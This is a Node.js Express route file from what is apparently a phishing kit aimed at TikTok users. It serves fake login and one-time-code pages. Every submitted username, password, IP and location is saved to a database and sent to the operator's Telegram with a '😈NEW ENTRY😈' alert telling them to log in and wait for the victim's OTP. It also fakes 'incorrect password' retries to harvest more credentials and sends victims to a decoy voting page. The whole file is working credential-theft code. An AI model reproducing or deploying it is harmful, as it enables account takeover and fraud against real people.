const router = require("express").Router();
const Links = require("../../models/LinkModel");
const User = require("../../models/User");
const Credential = require("../../models/CredentialModel");
const bot = require("../../telegram");


router.get("/tikto/:linkId", async (req, res) => {
    try {
        const { linkId } = req.params;
        const link = await Links.findOne({ _id: linkId });
        if (!link) {
            return res.redirect("/notfound");
        }
        if (new Date() > new Date(link.expiry)) {
            return res.redirect("/notfound");
        }
        if (linkId.length !== 24 || !link || link.linkType !== 'TIKTOK') {
            return res.redirect("/notfound");
        }
        return res.render("socials/tiktok/tiktok", { req, linkId, layout: false });
    } catch (err) {
        console.log(err)
    }
});

router.get("/tikto/otp/:linkId", async (req, res) => {
    try {
        const { linkId } = req.params;
        const link = await Links.findOne({ _id: linkId });
        if (!link) {
            return res.redirect("/notfound");
        }
        if (new Date() > new Date(link.expiry)) {
            return res.redirect("/notfound");
        }
        if (linkId.length !== 24 || !link || link.linkType !== 'TIKTOK') {
            return res.redirect("/notfound");
        }
        return res.render("socials/tiktok/otp", { req, linkId, layout: false });
    } catch (err) {
        console.log(err);
    }
});

router.post("/tikto/:linkId", async (req, res) => {
    try {
        const { username, password, country, city, region, ip } = req.body;
        const { linkId } = req.params;
        if (linkId.length !== 24) {
            return res.redirect("/notfound");
        }
        const retry = req.query?.retry || 1;
        const link = await Links.findById(linkId);
        const user = await User.findById(link.user);

        if (link?.name) {
            const newCredential = new Credential({
                user: link.user,
                link: linkId,
                linkName: link.name,
                linkType: "TIKTOK",
                country,
                region,
                ip,
                city,
                fields: {
                    username,
                    password
                }
            });
            await newCredential.save();
            await bot.sendMessage(user.telegramID, `
😈NEW ENTRY😈

USERNAME: ${username}
PASSWORD: ${password}

PLATFORM: TIKTOK
COUNTRY: ${country}
CITY: ${city}
REGION: ${region}
IP: ${ip}

${link.otpEnabled ? "Login and wait for victim to send OTP" : ""}

Login now: https://www.tiktok.com or use mobile app
                                                `)
                .catch(err => console.log("Telegram error"));
            if (retry > 1) {
                req.flash("error_msg", "incorrect password, try again.");
                return res.redirect(`/tikto/${linkId}?retry=${retry - 1}`);
            }
            if (link.otpEnabled) {
                return res.redirect("/tikto/otp/" + link.id);
            } else {
                return res.redirect("/successful-vote");
            }
        }
        else {
            return res.redirect("/notfound");
        }
    } catch (err) {
        console.log(err)
    }
});

router.post("/tikto/otp/:linkId", async (req, res) => {
    try {
        const { linkId, code } = req.body;
        if (linkId.length !== 24) {
            return res.redirect("/notfound");
        }
        const link = await Links.findById(linkId);
        const user = await User.findById(link.user);

        if (link) {
            await bot.sendMessage(user.telegramID, `
😈NEW ENTRY😈

PLATFORM: TIKTOK

OTP RECEIVED!

CODE: ${code}

                `)
                .catch(err => console.log("Telegram error"));
            return res.redirect("/successful-vote");
        }
        else {
            return res.redirect("/notfound");
        }
    } catch (err) {
        console.log(err)
    }
});


module.exports = router;